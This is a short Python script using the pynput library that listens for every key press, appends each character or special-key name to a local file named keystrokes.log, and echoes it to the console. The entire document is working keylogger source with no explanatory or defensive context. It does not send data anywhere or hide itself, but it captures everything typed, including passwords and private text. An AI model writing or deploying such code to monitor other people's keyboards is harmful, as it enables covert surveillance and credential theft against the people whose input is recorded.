import pynput

def log_key(key):
    try:
        with open("keystrokes.log", "a") as f:
            f.write(key.char)
        print(f"Key pressed: {key.char}")
    except AttributeError:
        with open("keystrokes.log", "a") as f:
            f.write(str(key))
        print(f"Special key pressed: {str(key)}")

keyboard_listener = pynput.keyboard.Listener(on_press=log_key)
keyboard_listener.start()
keyboard_listener.join()